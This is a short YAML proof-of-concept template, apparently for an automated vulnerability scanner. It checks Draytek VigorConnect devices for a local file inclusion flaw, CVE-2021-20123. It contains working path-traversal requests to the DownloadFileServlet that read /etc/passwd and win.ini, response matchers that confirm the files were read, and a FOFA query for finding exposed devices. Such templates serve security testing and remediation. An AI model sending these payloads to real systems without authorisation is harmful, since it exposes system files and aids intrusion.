id: poc-yaml-draytek-vigorconnect-local-file-inclusion
info:
  name: Draytek VigorConnect 本地文件包含漏洞(CVE-2021-20123)
  severity: high
  tags:
  - lfi
  - CVE-2021-20123
  finger: vigorconnect
  fofa: body="vigorconnect"
variables:
  paths: 'ACSServer/DownloadFileServlet?show_file_name=../../../../../../etc/passwd&type=uploadfile&path=anything

    ACSServer/DownloadFileServlet?show_file_name=../../../../../../windows/win.ini&type=uploadfile&path=anything

    '
requests:
- method: GET
  path: /{{.paths}}
  expression: '(status_code == 200 && contains(content_type,"application/octet-stream"))

    &&

    (

    (contains(body,"root:") && contains(body,"/bin"))

    ||

    (contains(body,"[files]") && contains(body,"bit app support"))

    )

    '
transport: http
